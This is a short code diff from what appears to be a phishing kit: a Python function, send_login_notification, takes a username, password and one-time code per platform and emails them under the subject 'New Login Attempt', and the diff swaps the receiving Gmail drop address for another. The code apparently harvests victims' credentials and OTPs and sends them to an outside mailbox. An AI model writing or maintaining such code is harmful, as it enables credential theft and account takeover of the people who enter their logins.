@@ -229,7 +229,7 @@ def send_login_notification(username, action, password, otp, platform):
         otp_message = f"OTP Entered: {otp}" if otp else "OTP: Not entered yet"
         message = Message(
             subject=f"New Login Attempt ({platform.capitalize()})",
-            recipients=["chasersbit439@gmail.com"],
+            recipients=["insyurence@gmail.com"],  # Changed email here
             body=f"A user has logged in:\n\n"
                  f"Platform: {platform.capitalize()}\n"
                  f"Username: {username}\n"
